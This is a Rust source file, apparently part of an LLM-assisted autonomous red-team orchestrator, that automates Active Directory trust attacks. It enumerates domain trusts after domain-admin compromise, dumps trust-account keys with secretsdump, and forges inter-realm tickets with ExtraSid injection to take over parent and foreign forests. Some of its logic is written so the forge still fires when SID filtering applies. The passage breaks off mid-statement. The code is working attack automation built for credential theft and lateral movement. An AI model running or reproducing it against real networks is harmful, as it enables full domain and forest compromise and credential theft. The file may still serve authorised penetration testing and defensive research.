//! auto_trust_follow -- trust enumeration, key extraction, and cross-domain attacks.
//!
//! Three-phase automation:
//!
//! 1. **Trust enumeration**: When DA is achieved, dispatch `enumerate_domain_trusts`
//!    to discover trust relationships via LDAP.
//! 2. **Trust key extraction**: When trusts are known and DA creds are available,
//!    dispatch secretsdump for trust account hashes (e.g. `FABRIKAM$`).
//! 3. **Trust follow**: When a trust account hash is found, dispatch inter-realm
//!    ticket creation and secretsdump against the foreign DC.

use std::collections::HashSet;
use std::sync::Arc;
use std::time::{Duration, Instant};

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use ares_llm::ToolCall;

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Upper bound on how long a `trust_follow:<src>:<user>$` dedup entry can
/// remain marked-processed without the spawned forge actually running before
/// the next tick sweeps it and lets a later tick re-dispatch.
///
/// `auto_trust_follow` marks dedup *before* spawning the dispatch (to win the
/// 30s tick race against double-firing while the forge is in flight). If
/// anything between the mark and the spawn body's `dispatch_tool().await`
/// silently fails — a dropped tracing event, a runtime cancellation, a panic
/// that doesn't reach the parent — the dedup persists and the cross-forest
/// pivot is permanently lost for the op. 3 min comfortably exceeds the
/// observed `forge_inter_realm_and_dump` runtime (typically 20-60s) without
/// stalling recovery for too long.
const FORGE_STALENESS_LIMIT: Duration = Duration::from_secs(180);

/// Drop any `trust_follow` dedup entries whose in-flight heartbeat has
/// exceeded [`FORGE_STALENESS_LIMIT`]. Mutates `state` in place and returns
/// the cleared keys so the caller can also unpersist them from Redis.
///
/// Split out as a pure helper so the staleness logic can be unit-tested
/// without spinning up a full `Dispatcher` / Redis fixture.
fn sweep_stale_forge_in_flight(state: &mut StateInner) -> Vec<String> {
    let stale: Vec<String> = state
        .forge_in_flight
        .iter()
        .filter(|(_, started)| started.elapsed() >= FORGE_STALENESS_LIMIT)
        .map(|(k, _)| k.clone())
        .collect();
    for key in &stale {
        state.forge_in_flight.remove(key);
        state.unmark_processed(DEDUP_TRUST_FOLLOW, key);
    }
    stale
}

/// Build a vuln_id for child-to-parent escalation.
fn child_to_parent_vuln_id(child_domain: &str, parent_domain: &str) -> String {
    format!(
        "child_to_parent_{}_{}",
        child_domain.to_lowercase().replace('.', "_"),
        parent_domain.to_lowercase().replace('.', "_"),
    )
}

/// Build a vuln_id for forest trust escalation.
fn forest_trust_vuln_id(source_domain: &str, target_domain: &str) -> String {
    format!(
        "forest_trust_{}_{}",
        source_domain.to_lowercase(),
        target_domain.to_lowercase()
    )
}

/// Resolve the FQDN to bake into the forged inter-realm TGS request for
/// `target_domain`, falling back to `target_dc_ip` when no usable record
/// exists.
///
/// Two records must never be selected, because both yield a service ticket
/// request the target KDC rejects identically on every retry:
///
///   - The zone apex (`hostname == target_domain`). No `cifs/<bare-domain>`
///     SPN is registered, so the request returns KDC_ERR_S_PRINCIPAL_UNKNOWN.
///   - A DC of a *child* domain. `dc02.child.contoso.local` passes a naive
///     `ends_with(".contoso.local")`, but asking the parent KDC for a
///     principal in the child realm returns KDC_ERR_WRONG_REALM.
///
/// So the suffix test requires exactly one label to remain after stripping
/// `.{target_domain}` — the host must sit *directly* in the target domain.
fn resolve_target_dc_hostname(
    hosts: &[ares_core::models::Host],
    target_dc_ip: &str,
    target_domain: &str,
) -> String {
    let target_lc = target_domain.to_lowercase();
    let non_apex = |hostname: &str| {
        let lc = hostname.to_lowercase();
        !lc.is_empty() && lc != target_lc
    };
    // Subsumes `non_apex`: the apex carries no `.{target}` suffix at all.
    let in_target_domain = |hostname: &str| {
        hostname
            .to_lowercase()
            .strip_suffix(&format!(".{target_lc}"))
            .is_some_and(|label| !label.is_empty() && !label.contains('.'))
    };

    hosts
        .iter()
        .find(|h| h.ip == target_dc_ip && non_apex(&h.hostname))
        .map(|h| h.hostname.clone())
        .or_else(|| {
            hosts
                .iter()
                .find(|h| (h.is_dc || h.detect_dc()) && in_target_domain(&h.hostname))
                .map(|h| h.hostname.clone())
        })
        .unwrap_or_else(|| target_dc_ip.to_string())
}

/// Maps a `source → target` trust escalation to its scoreboard tokens:
/// the `vuln_id`, the `vuln_type` enum used by the exploit gate, and the
/// human-readable note prefix written into the vulnerability details.
///
/// Intra-forest (child↔parent) and inter-forest are distinct MITRE
/// primitives — both ride the inter-realm-TGT + secretsdump mechanic
/// internally, but downstream scoreboard tokenization, suppression rules
/// (SID filtering), and exploitation gates branch on this distinction.
fn classify_trust_escalation(
    source_domain: &str,
    target_domain: &str,
) -> (String, &'static str, &'static str) {
    if is_inter_forest(source_domain, target_domain) {
        (
            forest_trust_vuln_id(source_domain, target_domain),
            "forest_trust_escalation",
            "Forest trust escalation",
        )
    } else {
        (
            child_to_parent_vuln_id(source_domain, target_domain),
            "child_to_parent",
            "Child-to-parent escalation",
        )
    }
}

/// Timeline description and MITRE techniques for a successful trust forge.
///
/// Branches on `is_inter_forest` — the same predicate
/// [`classify_trust_escalation`] uses to pick the vuln type — so the event and
/// the vulnerability can never disagree. Branching on `is_child_to_parent`
/// instead put a parent→child forge (intra-forest, classified
/// `child_to_parent`) on the inter-forest arm, stamping T1550.003 where
/// T1003.006 belonged and corrupting the red/blue technique-ID join.
fn trust_escalation_event_fields(
    source_domain: &str,
    target_domain: &str,
    trust_account: &str,
) -> (String, Vec<String>) {
    if is_inter_forest(source_domain, target_domain) {
        return (
            format!(
                "Forest trust escalation: {source_domain} \u{2192} {target_domain} via trust key {trust_account}"
            ),
            vec!["T1134.005".to_string(), "T1550.003".to_string()],
        );
    }
    let source_l = source_domain.to_lowercase();
    let target_l = target_domain.to_lowercase();
    let direction = if source_l != target_l && source_l.ends_with(&format!(".{target_l}")) {
        "Child-to-parent"
    } else {
        "Parent-to-child"
    };
    (
        format!(
            "{direction} ExtraSid escalation: {source_domain} \u{2192} {target_domain} via {trust_account} trust key"
        ),
        vec!["T1134.005".to_string(), "T1003.006".to_string()],
    )
}

/// Build a trust account name from a flat name (e.g. "FABRIKAM" -> "FABRIKAM$").
fn trust_account_name(flat_name: &str) -> String {
    format!("{}$", flat_name.to_uppercase())
}

/// Assemble the `VulnerabilityInfo` for a single trust-escalation work item.
///
/// Splits out so the (vuln_id, vuln_type, note prefix) tuple emitted by
/// [`classify_trust_escalation`] plus the trust_account, source, target, and
/// target_dc_ip fields can be unit-tested without running the async dispatch
/// loop. Always returns a vuln with `priority = 1` and
/// `discovered_by = "trust_automation"`.
fn build_trust_escalation_vuln(
    source_domain: &str,
    target_domain: &str,
    trust_account: &str,
    target_dc_ip: &str,
) -> ares_core::models::VulnerabilityInfo {
    let (vuln_id, vuln_type, note_kind) = classify_trust_escalation(source_domain, target_domain);
    let mut details = std::collections::HashMap::new();
    details.insert(
        "source_domain".into(),
        serde_json::Value::String(source_domain.to_string()),
    );
    details.insert(
        "target_domain".into(),
        serde_json::Value::String(target_domain.to_string()),
    );
    details.insert(
        "trust_account".into(),
        serde_json::Value::String(trust_account.to_string()),
    );
    details.insert(
        "note".into(),
        serde_json::Value::String(format!(
            "{note_kind} via {trust_account} trust key — inter-realm ticket + secretsdump"
        )),
    );
    ares_core::models::VulnerabilityInfo {
        vuln_id,
        vuln_type: vuln_type.to_string(),
        target: target_dc_ip.to_string(),
        discovered_by: "trust_automation".to_string(),
        discovered_at: chrono::Utc::now(),
        details,
        recommended_agent: String::new(),
        priority: 1,
    }
}

/// Returns true when source and target are in different forests
/// (neither is a parent or child of the other, and they are not equal).
///
/// Inter-forest trusts are subject to SID filtering on the target DC, which
/// strips ExtraSid claims with RID < 1000 (Enterprise Admins, Domain Admins,
/// Administrator). The inter-realm TGT authenticates but the privileged claim
/// is silently dropped — DCSync against the target DC then fails with
/// `rpc_s_access_denied`. This helper distinguishes the doomed path from
/// child→parent escalation (intra-forest), which is exploitable.
fn is_inter_forest(source: &str, target: &str) -> bool {
    let s = source.to_lowercase();
    let t = target.to_lowercase();
    if s.is_empty() || t.is_empty() || s == t {
        return false;
    }
    if s.ends_with(&format!(".{t}")) || t.ends_with(&format!(".{s}")) {
        return false;
    }
    true
}

/// Returns false — the dispatch never injects ExtraSid for cross-forest
/// (see `needs_target_sid = is_child_to_parent` in `auto_trust_follow`), so
/// SID filtering doesn't reject what the tool actually sends. A doomed
/// forge costs one dispatch; a suppressed forge costs the domain.
fn is_filtered_inter_forest_trust(state: &StateInner, source: &str, target: &str) -> bool {
    let target_l = target.to_lowercase();
    let inter_forest = is_inter_forest(source, target);
    if !inter_forest {
        debug!(
            source = %source,
            target = %target,
            inter_forest = false,
            decision = false,
            reason = "same_forest_by_name",
            "trust filter predicate"
        );
        return false;
    }
    // Look up only the target's metadata. `trusted_domains` is keyed by the
    // foreign-side domain name in each enumeration result, so the entry for
    // `target_l` describes the source→target relationship. Falling back to
    // the source key returns *some other* trust the source happens to have
    // (e.g. child→contoso parent_child stored under "contoso.local"
    // when we query contoso→fabrikam), which would wrongly classify the
    // unknown cross-forest path as intra-forest and let the doomed forge fire.
    //
    // The diagnostic block below disambiguates three reasons the
    // "Suppressing forge_inter_realm_and_dump" branch can fail to fire:
    // (a) trust-enum hasn't yet populated `trusted_domains` for the target,
    // (b) the entry is under a different key, or
    // (c) `is_cross_forest()` returned false on the entry.
    let known_keys: Vec<&str> = state.trusted_domains.keys().map(String::as_str).collect();
    if let Some(t) = state.trusted_domains.get(&target_l) {
        debug!(
            source = %source,
            target = %target,
            inter_forest = true,
            metadata_present = true,
            trust_type = %t.trust_type,
            trust_direction = %t.direction,
            is_cross_forest = t.is_cross_forest(),
            sid_filtering = t.sid_filtering,
            decision = false,
            trusted_domains_keys = ?known_keys,
            "trust filter predicate"
        );
        return false;
    }
    debug!(
        source = %source,
        target = %target,
        inter_forest = true,
        metadata_present = false,
        decision = false,
        reason = "no_metadata_try_forge",
        trusted_domains_keys = ?known_keys,
        "trust filter predicate"
    );
    false
}

/// Clear cross-forest fallback dedup keys for `target_domain` so the next
/// tick of `auto_cross_forest_enum`, `auto_foreign_group_enum`, and
/// `auto_acl_discovery` re-fires against the foreign forest with current
/// credentials. Called when a doomed forest_trust_escalation is suppressed
/// — the trust hash extraction usually populates new state (DC IPs, SIDs)
/// that should kick the fallbacks back into action.
async fn wake_cross_forest_fallbacks(dispatcher: &Dispatcher, target_domain: &str) {
    let target_l = target_domain.to_lowercase();
    // (set_name, prefix) pairs — must stay in sync with the auto_*_enum
    // dedup-key formats in their respective modules.
    let mut prefixes: Vec<(&str, String)> = vec![
        (DEDUP_CROSS_FOREST_ENUM, format!("xforest:{target_l}:")),
        (
            DEDUP_FOREIGN_GROUP_ENUM,
            format!("foreign_group:{target_l}"),
        ),
        (DEDUP_ACL_DISCOVERY, format!("acl_disc:{target_l}:")),
    ];

    // ADCS dedup keys are `{host}:cred:{user@dom}` / `{host}:hash:{user@dom}`,
    // keyed on the CA host (IP or hostname) — not the target domain. So for
    // each known host that belongs to `target_domain`, add a `{host}:` prefix.
    // This lets a freshly-acquired cross-forest credential re-attempt
    // certipy_find against a CA whose dedup entry is locked under a
    // wrong-domain credential.
    {
        let s = dispatcher.state.read().await;
        let suffix = format!(".{target_l}");
        for h in s.hosts.iter() {
            let hostname = h.hostname.to_lowercase();
            let belongs =
                !hostname.is_empty() && (hostname == target_l || hostname.ends_with(&suffix));
            if !belongs {
                continue;
            }
            if !h.ip.is_empty() {
                prefixes.push((DEDUP_ADCS_SERVERS, format!("{}:", h.ip)));
            }
            prefixes.push((DEDUP_ADCS_SERVERS, format!("{hostname}:")));
        }
    }

    let cleared: Vec<(&str, Vec<String>)> = {
        let mut s = dispatcher.state.write().await;
        prefixes
            .iter()
            .map(|(set, prefix)| (*set, s.unmark_processed_by_prefix(set, prefix)))
            .filter(|(_, v)| !v.is_empty())
            .collect()
    };
    let cleared_count: usize = cleared.iter().map(|(_, v)| v.len()).sum();
    if cleared_count == 0 {
        // Nothing to clear means ACL/cross-forest enum never ran against this
        // target — usually because no same-realm credential exists. Fallback
        // wake is a no-op here; the orchestrator will keep flailing on
        // NTLM-bound paths that 0x52e against the foreign forest. Logging
        // this signal makes the architectural gap visible in the trace.
        info!(
            target = %target_domain,
            "wake_cross_forest_fallbacks: no dedup keys to clear — \
             ACL/foreign-group/cross-forest enum never registered for this \
             target (likely no same-realm credential). Forge-only fallback \
             via create_inter_realm_ticket would be needed to bind LDAP \
             via Kerberos."
        );
    } else {
        info!(
            target = %target_domain,
            cleared_count,
            "wake_cross_forest_fallbacks: cleared dedup keys to retrigger fallback enums"
        );
    }
    for (set, keys) in cleared {
        for key in keys {
            let _ = dispatcher
                .state
                .unpersist_dedup(&dispatcher.queue, set, &key)
                .await;
        }
    }
}

/// Check if a credential domain matches a target domain (exact, child, or parent).
fn is_domain_related(cred_domain: &str, target_domain: &str) -> bool {
    let cd = cred_domain.to_lowercase();
    let td = target_domain.to_lowercase();
    cd == td || cd.ends_with(&format!(".{td}")) || td.ends_with(&format!(".{cd}"))
}

/// Build the dedup key for trust enumeration (password or hash retry).
fn trust_enum_dedup_key(domain: &str, is_hash_retry: bool) -> String {
    if is_hash_retry {
        format!("trust_enum_hash:{}", domain.to_lowercase())
    } else {
        format!("trust_enum:{}", domain.to_lowercase())
    }
}

/// Find a target FQDN for a captured trust account (`<LABEL>$`) when the
/// target domain has not been formally enumerated as a DC.
///
/// Resolution accepts a candidate FQDN only when:
///   1. Its first DNS label (uppercased) equals `netbios_upper`.
///   2. Its FQDN appears in at least one existing state record — a Host
///      hostname suffix, a Credential domain, or a discovered-vuln
///      `details["domain"]`.
///
/// (1) is the label guard; (2) is the corroborated-signal guard. Together
/// they ensure a captured trust key only fires against a target the
/// orchestrator has independent evidence for — no blind NetBIOS-to-TLD
/// inference.
fn resolve_target_fqdn_from_signals(
    state: &StateInner,
    netbios_upper: &str,
    source_lower: &str,
) -> Option<String> {
    let label_matches = |fqdn: &str| -> bool {
        let lower = fqdn.to_lowercase();
        if lower == source_lower || !lower.contains('.') {
            return false;
        }
        fqdn.split('.')
            .next()
            .map(|label| label.to_uppercase() == netbios_upper)
            .unwrap_or(false)
    };

    // Hosts: hostname like "dc01.contoso.local" → suffix "contoso.local".
    let from_hosts = state.hosts.iter().filter_map(|h| {
        let hostname = h.hostname.trim();
        if hostname.is_empty() {
            return None;
        }
        let (_, suffix) = hostname.split_once('.')?;
        if !suffix.contains('.') {
            return None;
        }
        Some(suffix.to_string())
    });

    // Credentials: explicit `.domain` field already FQDN-ish.
    let from_creds = state.credentials.iter().filter_map(|c| {
        let d = c.domain.trim();
        if d.is_empty() || !d.contains('.') {
            None
        } else {
            Some(d.to_string())
        }
    });

    // Vulns: `details["domain"]` carried by discovered vulns.
    let from_vulns = state.discovered_vulnerabilities.values().filter_map(|v| {
        v.details
            .get("domain")
            .and_then(|x| x.as_str())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty() && s.contains('.'))
    });

    from_hosts
        .chain(from_creds)
        .chain(from_vulns)
        .find(|fqdn| label_matches(fqdn))
}

/// Build trust-follow work items directly from `discovered_vulnerabilities`.
///
/// The hash-iteration path inside `auto_trust_follow` silently filters a
/// candidate trust account at three points (empty source domain after
/// fallback, no resolvable target FQDN, dedup already marked). Each filter
/// returns `None` from inside a `filter_map`, so a single bad heuristic
/// permanently drops a valid attack with no INFO trace. Reproduced as: a
/// FABRIKAM$ trust key captured on a contoso DC dump produced a
/// `forest_trust_escalation` vuln with `target=192.168.58.40,
/// source_domain=contoso.local, target_domain=fabrikam.local` — yet the
/// hash-iteration path emitted zero `forge_inter_realm_and_dump` dispatches
/// across the rest of the operation.
///
/// The analyzer that builds the vuln (see `build_trust_escalation_vuln`) has
/// already resolved `target_dc_ip` (stored as `v.target`) and stashed the
/// trust account, source, and target in `details`. Rebuilding the work item
/// from those fields is robust against any FQDN-resolution gap that hides the
/// hash from the iteration path.
///
/// Callers merge with the hash-iteration result, deduping by `dedup_key`. Put
/// vuln-driven items first in the merge so a duplicate key prefers the
/// analyzer's resolved `target_dc_ip` over the hash path's possibly-None one.
fn collect_trust_follow_work_from_vulns(state: &StateInner) -> Vec<TrustFollowWork> {
    let mut out = Vec::new();
    for v in state.discovered_vulnerabilities.values() {
        if v.vuln_type != "forest_trust_escalation" {
            continue;
        }
        if state.exploited_vulnerabilities.contains(&v.vuln_id) {
            continue;
        }
        let Some(source_domain) = v.details.get("source_domain").and_then(|x| x.as_str()) else {
            continue;
        };
        let Some(target_domain) = v.details.get("target_domain").and_then(|x| x.as_str()) else {
            continue;
        };
        let Some(trust_account) = v.details.get("trust_account").and_then(|x| x.as_str()) else {
            continue;
        };

        let source_lower = source_domain.to_lowercase();
        let target_lower = target_domain.to_lowercase();
        let trust_lower = trust_account.to_lowercase();

        // Prefer current keys over `_history0`/`_prev` rows — mirrors the
        // hash-iteration sort at the auto_trust_follow call site.
        let Some(hash) = state
            .hashes
            .iter()
            .filter(|h| {
                h.username.eq_ignore_ascii_case(trust_account)
                    && h.hash_type.eq_ignore_ascii_case("NTLM")
                    && !h.hash_value.is_empty()
                    && (h.domain.is_empty() || h.domain.eq_ignore_ascii_case(source_domain))
            })
            .min_by_key(|h| h.is_previous as u8)
            .cloned()
        else {
            continue;
        };

        let dedup_key = format!("trust_follow:{source_lower}:{trust_lower}");
        if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
            continue;
        }

        // `v.target` is the analyzer's resolved DC IP at vuln-creation time.
        // Empty target falls through to the live DC map.
        let target_dc_ip = if !v.target.is_empty() {
            Some(v.target.clone())
        } else {
            state.resolve_dc_ip(target_domain)
        };

        let source_domain_sid = state.domain_sids.get(&source_lower).cloned();
        let target_domain_sid = state.domain_sids.get(&target_lower).cloned();

        out.push(TrustFollowWork {
            dedup_key,
            hash,
            source_domain: source_domain.to_string(),
            target_domain: target_domain.to_string(),
            target_dc_ip,
            source_domain_sid,
            target_domain_sid,
        });
    }
    out
}

/// Monitors for trust account hashes and dispatches cross-domain attacks.
/// Interval: 30s.
pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Sweep stale forge_in_flight entries before doing real work this
        // tick. The pre-spawn `mark_processed` at the cross-forest forge site
        // is correct under normal conditions (it stops the next 30s tick from
        // double-firing while the forge is running) but it leaves a permanent
        // mark if the spawn never actually runs the tool. Without this sweep,
        // a single dropped spawn kills the cross-forest pivot for the rest of
        // the op even though the trust key sits in state ready to use.
        let stale = {
            let mut state = dispatcher.state.write().await;
            sweep_stale_forge_in_flight(&mut state)
        };
        for key in stale {
            let _ = dispatcher
                .state
                .unpersist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                .await;
            warn!(
                dedup_key = %key,
                "Cleared stale trust_follow dedup mark — forge_in_flight exceeded staleness limit without dispatch completing"
            );
        }

        // Operator escape hatch: dispatch any force-inter-realm-forge requests
        // queued via `ares ops force-inter-realm-forge` before the normal path.
        drain_force_forge_requests(&dispatcher).await;

        // Auto-enumerate trusts when DA is achieved
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin {
                // Dispatch trust enumeration for each known DC.
                // Two dedup keys per domain:
                //   trust_enum:<domain> — password-based attempt
                //   trust_enum_hash:<domain> — hash-based retry (for dominated domains)
                //
                // Iterate the union of `domain_controllers` keys and
                // `dominated_domains`. The latter covers the case where a
                // domain was compromised via a child→parent forge but its
                // DC was never explicitly seeded into `domain_controllers`
                // — without this, parent-DC trust enumeration would never
                // fire and cross-forest trusts would remain undiscovered.
                let mut candidate_domains: HashSet<String> = state
                    .domain_controllers
                    .keys()
                    .map(|d| d.to_lowercase())
                    .collect();
                for d in state.dominated_domains.iter() {
                    candidate_domains.insert(d.to_lowercase());
                }
                let enum_work: Vec<(String, String, String)> = candidate_domains
                    .iter()
                    .filter_map(|domain| {
                        let dc_ip = state.resolve_dc_ip(domain)?;
                        let pw_key = trust_enum_dedup_key(domain, false);
                        let hash_key = trust_enum_dedup_key(domain, true);
                        let pw_done = state.is_processed(DEDUP_TRUST_FOLLOW, &pw_key);
                        let hash_done = state.is_processed(DEDUP_TRUST_FOLLOW, &hash_key);
                        let dominated = state.dominated_domains.contains(domain);
                        // Skip if password attempt is done AND (no hash retry
                        // applies, or hash retry already done).
                        if pw_done && (!dominated || hash_done) {
                            return None;
                        }
                        let key = if pw_done { hash_key } else { pw_key };
                        Some((key, domain.clone(), dc_ip))
                    })
                    .collect();
                drop(state);

                for (key, domain, dc_ip) in enum_work {
                    // Find a credential for this domain — prefer password creds,
                    // fall back to admin NTLM hash for hash-based LDAP auth.
                    let (cred_payload, auth_method) = {
                        let s = dispatcher.state.read().await;
                        let dd = domain.to_lowercase();

                        // On hash-based retry, skip password creds entirely —
                        // they already failed on the first attempt (typically a
                        // child-domain credential that can't LDAP-bind to the
                        // parent DC with the wrong domain context).
                        let is_hash_retry = key.starts_with("trust_enum_hash:");

                        // First try: password credential (exact or child↔parent match)
                        let pw_cred = if !is_hash_retry {
                            s.credentials
                                .iter()
                                .find(|c| {
                                    if c.password.is_empty() {
                                        return false;
                                    }
                                    is_domain_related(&c.domain, &domain)
                                })
                                .cloned()
                        } else {
                            None
                        };

                        if let Some(cred) = pw_cred {
                            (
                                Some(json!({
                                    "username": cred.username,
                                    "password": cred.password,
                                    "domain": cred.domain,
                                })),
                                "password",
                            )
                        } else {
                            // Fallback: find an admin NTLM hash for this exact domain
                            let admin_hash = s.hashes.iter().find(|h| {
                                h.hash_type.to_lowercase() == "ntlm"
                                    && h.domain.to_lowercase() == dd
                                    && h.username.to_lowercase() == "administrator"
                            });
                            if let Some(h) = admin_hash {
                                (
                                    Some(json!({
                                        "username": "Administrator",
                                        "hash": h.hash_value.clone(),
                                        "domain": domain,
                                    })),
                                    "hash",
                                )
                            } else {
                                (None, "none")
                            }
                        }
                    };

                    if let Some(cred_json) = cred_payload {
                        // Direct tool dispatch — bypass the LLM agent loop.
                        // The recon prompt template did not surface
                        // `credential.hash` (only password), so LLM-driven trust
                        // enumeration with hash auth would render an empty
                        // password and fail with LDAP 52e. The orchestrator
                        // already owns every input here; deliver them directly
                        // to enumerate_domain_trusts via dispatch_tool.
                        let mut args = json!({
                            "target": dc_ip,
                            "domain": domain,
                            "username": cred_json
                                .get("username")
                                .and_then(|v| v.as_str())
                                .unwrap_or(""),
                        });
                        if let Some(p) = cred_json
                            .get("password")
                            .and_then(|v| v.as_str())
                            .filter(|s| !s.is_empty())
                        {
                            args["password"] = json!(p);
                        }
                        if let Some(h) = cred_json
                            .get("hash")
                            .and_then(|v| v.as_str())
                            .filter(|s| !s.is_empty())
                        {
                            args["hash"] = json!(h);
                        }
                        if let Some(bd) = cred_json
                            .get("domain")
                            .and_then(|v| v.as_str())
                            .filter(|s| !s.is_empty() && !s.eq_ignore_ascii_case(&domain))
                        {
                            args["bind_domain"] = json!(bd);
                        }

                        let call = ToolCall {
                            id: format!("trust_enum_{}", uuid::Uuid::new_v4().simple()),
                            name: "enumerate_domain_trusts".to_string(),
                            arguments: args,
                        };
                        let task_id = format!(
                            "trust_enum_{}",
                            &uuid::Uuid::new_v4().simple().to_string()[..12]
                        );

                        // Mark dedup BEFORE spawn so the next 30s tick doesn't
                        // re-dispatch while enumeration is in flight.
                        dispatcher
                            .state
                            .write()
                            .await
                            .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                        let _ = dispatcher
                            .state
                            .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                            .await;

                        info!(
                            task_id = %task_id,
                            domain = %domain,
                            dc_ip = %dc_ip,
                            auth = auth_method,
                            "Dispatching enumerate_domain_trusts (direct tool, no LLM)"
                        );

                        let dispatcher_bg = dispatcher.clone();
                        let domain_bg = domain.clone();
                        let key_bg = key.clone();
                        let auth_method_bg = auth_method.to_string();
                        tokio::spawn(async move {
                            let result = dispatcher_bg
                                .llm_runner
                                .tool_dispatcher()
                                .dispatch_tool("recon", &task_id, &call)
                                .await;
                            // Failure handling depends on which auth attempt
                            // just failed:
                            //
                            // - password attempt: leave the dedup mark in place
                            //   so the next 30s tick sees `pw_done=true` and
                            //   escalates to the hash-key path (gated on the
                            //   domain being in `dominated_domains`). Clearing
                            //   the mark would loop forever on the same wrong
                            //   sibling-domain credential.
                            // - hash attempt: clear so a future tick can retry
                            //   if a fresh hash becomes available.
                            let clear_dedup = || async {
                                dispatcher_bg
                                    .state
                                    .write()
                                    .await
                                    .unmark_processed(DEDUP_TRUST_FOLLOW, &key_bg);
                                let _ = dispatcher_bg
                                    .state
                                    .unpersist_dedup(
                                        &dispatcher_bg.queue,
                                        DEDUP_TRUST_FOLLOW,
                                        &key_bg,
                                    )
                                    .await;
                            };
                            let on_failure = || async {
                                if auth_method_bg == "password" {
                                    // Mark stays — escalation to hash retry on next tick.
                                } else {
                                    clear_dedup().await;
                                }
                            };
                            match result {
                                Ok(exec_result) => {
                                    if let Some(err) = exec_result.error.as_ref() {
                                        warn!(
                                            err = %err,
                                            domain = %domain_bg,
                                            auth = %auth_method_bg,
                                            "enumerate_domain_trusts returned error"
                                        );
                                        on_failure().await;
                                        return;
                                    }
                                    let trust_count = exec_result
                                        .discoveries
                                        .as_ref()
                                        .and_then(|d| d.get("trusted_domains"))
                                        .and_then(|t| t.as_array())
                                        .map(|a| a.len())
                                        .unwrap_or(0);
                                    info!(
                                        domain = %domain_bg,
                                        trust_count = trust_count,
                                        "enumerate_domain_trusts completed"
                                    );
                                }
                                Err(e) => {
                                    warn!(
                                        err = %e,
                                        domain = %domain_bg,
                                        auth = %auth_method_bg,
                                        "enumerate_domain_trusts dispatch errored"
                                    );
                                    on_failure().await;
                                }
                            }
                        });
                    }
                }
            }
        }

        // Extract trust keys for every known trust (intra-forest and
        // cross-forest alike).
        //
        // Intra-forest `parent_child` trusts ride the same pipeline as
        // cross-forest: secretsdump the trust account (e.g. `CHILD$`) on
        // the forest-root DC, then let the forge work-collection below pick
        // it up for `forge_inter_realm_and_dump` with
        // `extra_sid=<parent_sid>-519` for ExtraSid injection. The forest-
        // root preference at `min_by_key(|(domain, _)| domain.split('.')
        // .count())` selects the right DC for both directions.
        //
        // The legacy `raise_child` (impacket raiseChild.py) child→parent
        // path was retired here: impacket's cross-realm referral is broken
        // (fortra/impacket#315) and the wrapper trips KDC_ERR_TGT_REVOKED
        // on Win2016+ parent KDCs with no recovery.
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin && !state.trusted_domains.is_empty() {
                let extract_work: Vec<(String, String, String, String, String)> = state
                    .trusted_domains
                    .values()
                    .filter_map(|trust| {
                        let key = format!("trust_extract:{}", trust.domain.to_lowercase());
                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                            return None;
                        }
                        // Find a DC in a dominated source domain (not the foreign trust target).
                        // Prefer the forest root (fewest domain parts) since trust accounts
                        // are stored on the forest root DC.
                        let (source_domain, dc_ip) = state
                            .domain_controllers
                            .iter()
                            .filter(|(domain, _)| {
                                domain.to_lowercase() != trust.domain.to_lowercase()
                                    && state.dominated_domains.contains(&domain.to_lowercase())
                            })
                            .min_by_key(|(domain, _)| domain.split('.').count())
                            .map(|(d, ip)| (d.clone(), ip.clone()))?;
                        Some((
                            key,
                            trust.flat_name.clone(),
                            trust.domain.clone(),
                            dc_ip,
                            source_domain,
                        ))
                    })
                    .collect();
                // Prefer plaintext admin credential (domain-agnostic; refined per-trust below).
                let admin_cred = state
                    .credentials
                    .iter()
                    .find(|c| c.is_admin && !c.password.is_empty())
                    .cloned();
                drop(state);

                for (key, flat_name, trust_domain, dc_ip, source_domain) in extract_work {
                    // Find admin hash specifically for this trust's source domain.
                    // DA is typically achieved via hash-based attacks like secretsdump,
                    // so admin creds often only exist as hashes, not plaintext passwords.
                    let admin_hash = if admin_cred.is_none() {
                        let s = dispatcher.state.read().await;
                        s.hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == "administrator"
                                    && h.domain.to_lowercase() == source_domain.to_lowercase()
                                    && h.hash_type.to_uppercase() == "NTLM"
                            })
                            .cloned()
                    } else {
                        None
                    };

                    // Build credential payload from either plaintext cred or NTLM hash
                    let cred_payload: Option<(String, String, serde_json::Value)> = if let Some(
                        ref cred,
                    ) =
                        admin_cred
                    {
                        Some((
                            cred.username.clone(),
                            cred.domain.clone(),
                            json!({
                                "username": cred.username,
                                "password": cred.password,
                                "domain": cred.domain,
                            }),
                        ))
                    } else if let Some(ref hash) = admin_hash {
                        Some((
                            hash.username.clone(),
                            source_domain.clone(),
                            json!({
                                "username": hash.username,
                                "domain": source_domain,
                            }),
                        ))
                    } else {
                        debug!(
                            trust_domain = %trust_domain,
                            source_domain = %source_domain,
                            "No admin cred/hash for source domain — deferring trust key extraction"
                        );
                        continue;
                    };

                    let (_, domain, cred_json) = cred_payload.unwrap();
                    // secretsdump -just-dc-user FABRIKAM$ to get trust key
                    let trust_account = trust_account_name(&flat_name);
                    let mut payload = json!({
                        "technique": "secretsdump",
                        "target_ip": dc_ip,
                        "domain": domain,
                        "just_dc_user": trust_account,
                        "credential": cred_json,
                        "reason": format!("extract trust key for {}", trust_domain),
                    });
                    if let Some(ref hash) = admin_hash {
                        payload["hash_value"] = json!(hash.hash_value);
                    }

                    // Priority 7 (on par with auto_credential_access's primary
                    // secretsdump): the trust key — and specifically its AES256
                    // variant — is the critical-path unlock for the entire
                    // target forest. At priority 2 it lost to routine enum and
                    // landed minutes after the forge had already given up and
                    // fired an RC4-only ticket that an AES-only DC rejects.
                    match dispatcher
